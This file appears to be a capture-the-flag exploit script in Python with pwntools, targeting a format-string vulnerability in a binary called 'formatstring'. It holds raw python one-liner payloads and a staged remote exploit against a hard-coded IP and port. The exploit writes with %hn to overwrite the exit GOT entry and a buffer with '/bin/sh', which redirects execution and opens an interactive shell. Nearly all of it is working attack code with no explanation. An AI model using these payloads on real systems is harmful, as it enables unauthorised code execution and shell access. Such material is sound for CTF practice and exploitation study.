# SOL1: python -c "print '\x20\xa0\x04\x08'+'\x34\xa0\x04\x08'+'%34163x'+'%11\$hn'" | ./formatstring 
#	python -c "print '\x34\xa0\x04\x08'+'\x20\xa0\x04\x08'+'\x36\xa0\x04\x08'+'%12118x'+'%11\$hn'+'%22031x'+'%12\$hn'" | ./formatstring 
# python -c "print '\x34\xa0\x04\x08'+'\x20\xa0\x04\x08'+'\x36\xa0\x04\x08'+'%25123x'+'%11\$hn'+'%9036x'+'%12\$hn'+'%448609052910x'+'13\$n'" | ./formatstring 
# python -c "print '\x3a\xa0\x04\x08'+'\x34\xa0\x04\x08'+'\x36\xa0\x04\x08'+'\x38\xa0\x04\x08'+'\x20\xa0\x04\x08'+'%84x'+'%11\$hn'+'%25031x'+'%12\$hn'+'%3130x'+'%13\$hn'+'%1222x'+'%14\$hn'+'%4684x'+'%15\$hn'" | ./formatstring 

# 0x0068 = 104 (\x3a\xa0\x04\x08)
# 0x622f = 25135 (\x34\xa0\x04\x08)
# 0x6e69 = 28265 (\x36\xa0\x04\x08)
# 0x732f = 29487 (\x38\xa0\x04\x08)
# 0x857b = 34171 (\x20\xa0\x04\x08)
# main: 0x85a4 = 34212 (\x20\xa0\x04\x08)

from pwn import *

e = ELF("./formatstring")
p = remote("103.237.99.35",28992)
#p = process("./formatstring")

#gdb.attach(p, "b *main+144")
#for symbol in e.symbols:
#	print symbol, hex(e.symbols[symbol])

'''
#overwrite exit.got 0x804a020 value with hidden: 0x804857b
#exit_got = int(0x804a020)
#hidden_plt = int(0x804857b)

# overwrite 0x0804A034 N0PE_STR value with "/bin/sh" (68 73 2f 6e 69 62 2f)'''

print p.recv()

''' FAIL '''
#payload = p32(int(0x804a03a))+p32(int(0x804a034))+p32(int(0x804a036))+p32(int(0x804a038))+p32(int(0x804a020))+"%84x"+"%11$hn"+"%25031x"+"%12$hn"+"%3130x"+"%13$hn"+"%1222x"+"%14$hn"+"%4684x"+"%15$hn"

''' SUCCESS '''
# STAGE 1: overwrite 4 bytes in N0PE_STR and ret to main
payload = p32(int(0x804a03a))+p32(int(0x804a034))+p32(int(0x804a020))+"%92x"+"%11$hn"+"%25031x"+"%12$hn"+"%9077x"+"%13$hn"
p.sendline(payload)

print p.recv()

# STAGE 2: overwrite last 4 bytes in NOPE_STR and ret to hidden (idk why overwrite 8 bytes at a time not working)
payload = p32(int(0x804a036))+p32(int(0x804a038))+p32(int(0x804a020))+"%28253x"+"%11$hn"+"%1222x"+"%12$hn"+"%4684x"+"%13$hn"

print p.sendline(payload)
p.interactive()

